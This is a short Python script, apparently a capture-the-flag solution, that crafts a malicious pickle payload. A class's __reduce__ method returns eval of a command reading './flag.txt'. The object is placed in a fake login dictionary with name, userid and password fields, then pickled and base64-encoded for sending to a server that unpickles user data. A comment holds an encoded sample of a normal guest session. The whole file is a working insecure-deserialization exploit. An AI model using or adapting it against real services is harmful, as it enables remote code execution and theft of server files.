import pickle, base64
# gAN9cQAoWAQAAABuYW1lcQFYBQAAAGd1ZXN0cQJYBgAAAHVzZXJpZHEDWAUAAABndWVzdHEEWAgAAABwYXNzd29yZHEFWAUAAABndWVzdHEGdS4=

class Webcome:
    def __reduce__(self): #__reduce__(클래스에 대한 내장 함수)
        cmd = "open('./flag.txt', 'r').read()"
        return (__builtins__.eval, (cmd,))


data = {'name': Webcome(), 'userid': 'idid', 'password': 'passpass'}
payload = base64.b64encode(pickle.dumps(data)).decode('utf8')
print(payload)